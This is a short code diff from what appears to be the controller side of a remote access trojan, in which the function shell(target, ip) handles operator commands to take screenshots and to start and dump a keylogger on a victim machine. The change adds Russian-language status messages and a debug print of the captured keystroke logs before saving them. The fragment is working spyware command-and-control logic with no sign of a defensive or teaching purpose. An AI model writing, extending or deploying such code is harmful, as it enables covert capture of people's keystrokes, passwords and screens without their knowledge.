@@ -119,12 +119,12 @@ def shell(target, ip):
             elif command.startswith("screenshot"):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
-            elif command.startswith("keylog_start"):
-                response = reliable_recv(target)
-                print(response)
-                logging.info(response)
-            elif command.startswith("keylog_dump"):
+            elif command == "keylog_start":
+                print("[+] Кейлоггер запущен на клиенте.")
+                logging.info("[+] Кейлоггер запущен на клиенте.")
+            elif command == "keylog_dump":
                 logs = reliable_recv(target)
+                print(f"Полученные логи: {logs}")  # Для отладки
                 save_keylogs(logs)
             else:
                 try:
